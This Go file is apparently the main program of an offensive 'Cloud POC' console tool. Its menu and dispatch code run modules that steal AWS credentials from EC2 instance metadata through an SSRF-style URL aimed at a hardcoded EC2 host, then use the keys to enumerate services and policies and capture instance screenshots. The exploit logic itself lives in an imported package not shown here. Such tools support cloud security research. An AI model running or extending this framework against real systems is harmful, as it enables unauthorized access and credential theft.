package main

import (
	"bufio"
	"fmt"
	"os"
	"reflect"
	"strings"

	"github.com/gookit/color"
	"github.com/spf13/cobra"

	ec2 "github.com/windasunny/cloud-poc/module/aws/ec2"
)

type CloudPoc struct {
	prompt    string
	targetNum int
	exploit   string
}

type awsCreds struct {
	Region          string
	AccessKeyId     string
	SecretAccessKey string
}

var awsCredsInfo awsCreds
var ec2Exploit *ec2.Ec2

var rootCmd = &cobra.Command{
	Use:   "cloudpoc",
	Short: "Cloud POC tool",
	Run: func(_ *cobra.Command, _ []string) {
		cloud := NewCloudPoc()
		cloud.asciiArt()
		color.Cyan.Println("Welcome to Cloud Poc, which provides cloud POC. Type \"help\" to see the list of available commands.\n")
		cloud.cmdLoop()
	},
}

var helpCmd = &cobra.Command{
	Use:   "help",
	Short: "Show help message",
	Run: func(_ *cobra.Command, args []string) {
		cloud := NewCloudPoc()
		cloud.Help(args)
	},
}

var useCmd = &cobra.Command{
	Use:   "use [module]",
	Short: "Use a module",
	Args:  cobra.ExactArgs(1),
	Run: func(_ *cobra.Command, args []string) {
		cloud := NewCloudPoc()
		cloud.Use(args[0])
	},
}

func NewCloudPoc() *CloudPoc {
	return &CloudPoc{
		prompt:    "[Cloud Poc] >> ",
		targetNum: 1,
	}
}

func (cloud *CloudPoc) asciiArt() {
	color.Blue.Println("      _                 _     ")
	color.Blue.Println("     | |               | |    ")
	color.Blue.Println("  ___| | ___  _   _  __| |___ ")
	color.Blue.Println(" / __| |/ _ \\| | | |/ _` / __|")
	color.Blue.Println("| (__| | (_) | |_| | (_| \\__ \\")
	color.Blue.Println(" \\___|_|\\___/ \\__,_|\\__,_|___/")
	color.Blue.Println("                              ")
}

func firstUpper(s string) string {
	if s == "" {
		return ""
	}
	return strings.ToUpper(s[:1]) + s[1:]
}

func getSubdirectories(path string) ([]string, error) {
	var subdirectories []string

	files, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}

	for _, file := range files {
		if file.IsDir() {
			subdirectories = append(subdirectories, file.Name())
		}
	}

	return subdirectories, nil
}

func (cloud *CloudPoc) handleInput(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	cmdName := firstUpper(parts[0])
	cmdArgs := parts[1:]

	cloudType := reflect.TypeOf(cloud)
	method, found := cloudType.MethodByName(cmdName)

	if found {
		var args []reflect.Value
		args = append(args, reflect.ValueOf(cloud))
		if (cmdName == "Use" || cmdName == "List") && len(cmdArgs) > 0 {
			args = append(args, reflect.ValueOf(cmdArgs[0]))
		} else {
			args = append(args, reflect.ValueOf(cmdArgs))
		}

		method.Func.Call(args)
	} else {
		color.Red.Println("Unknown command. Type 'help' for available commands.")
	}
}

func (cloud *CloudPoc) Help(args []string) {
	color.White.Println("Available commands:")
	color.White.Println("  help - Show this help message")
	color.White.Println("  use - Use aws module")
	color.White.Println("    aws/ec2/credential - use ec2 imds exploit module")
	color.White.Println("    aws/ec2/searchservice - use ec2 imds exploit module")
	color.White.Println("    aws/ec2/screenshot - use ec2 screenshot exploit module")
	color.White.Println("  quit - Exit the program")
}

func (cloud *CloudPoc) List(module string) {
	if module == "" {
		color.Red.Println("No module selected. Type 'help' for available commands.")
		return
	}

	color.Cyan.Println("Module: ", module)
	color.White.Println("Available commands:")

	modulePath := "module/" + module
	subdirectories, err := getSubdirectories(modulePath)
	if err != nil {
		color.Red.Println("Module Error:", err)
		return
	}

	for _, dir := range subdirectories {
		color.White.Println("  ", dir)
	}
}

func (cloud *CloudPoc) Use(exploit string) {
	if len(exploit) == 0 {
		color.Red.Println("No module specified. Type 'help' for available commands.")
		return
	}

	switch exploit {
	case "aws/ec2/credential":
		printPrompt(cloud, exploit)

		ec2Exploit = ec2.NewEC2Module("http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=")

		ec2Exploit.Exploit()

		break
	case "aws/ec2/searchservice":
		printPrompt(cloud, exploit)
		if ec2Exploit.AccessKeyId == "" && ec2Exploit.SecretAccessKey == "" {
			color.Red.Println("Please use the 'aws/ec2/credential' module first.")
			return
		}

		ec2Exploit.SearchService()

		break
	case "aws/ec2/listpolicy":
		printPrompt(cloud, exploit)
		if ec2Exploit.AccessKeyId == "" && ec2Exploit.SecretAccessKey == "" {
			color.Red.Println("Please use the 'aws/ec2/credential' module first.")
			return
		}

		ec2Exploit.ListPolicy()
		break
	case "aws/ec2/screenshot":
		printPrompt(cloud, exploit)

		if awsCredsInfo.AccessKeyId == "" && awsCredsInfo.SecretAccessKey == "" {
			color.Red.Println("Please add aws credential first.")
			return
		}

		ec2.Screenshot(awsCredsInfo.AccessKeyId, awsCredsInfo.SecretAccessKey)
		break
	default:
		color.Red.Println("Unknown module. Type 'help' for available commands.")
		return
	}
}

func (cloud *CloudPoc) cmdLoop() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		color.Green.Print(cloud.prompt)
		scanner.Scan()
		input := scanner.Text()

		if strings.ToLower(input) == "quit" || strings.ToLower(input) == "exit" {
			color.Green.Println("Exiting...")
			break
		}

		cloud.handleInput(input)
	}

	if err := scanner.Err(); err != nil {
		color.Red.Println("Error reading input:", err)
	}
}

func printPrompt(cloud *CloudPoc, exploit string) {
	cloud.exploit = exploit
	cloud.prompt = fmt.Sprintf("[Cloud Poc] >> [%s] >> ", cloud.exploit)
}

func init() {
	rootCmd.PersistentFlags().StringVarP(&awsCredsInfo.Region, "region", "r", "", "AWS Region")
	rootCmd.PersistentFlags().StringVarP(&awsCredsInfo.AccessKeyId, "access-key", "a", "", "AWS Access Key ID")
	rootCmd.PersistentFlags().StringVarP(&awsCredsInfo.SecretAccessKey, "secret-key", "s", "", "AWS Secret Access Key")
}

func init() {
	rootCmd.AddCommand(helpCmd)
	rootCmd.AddCommand(useCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
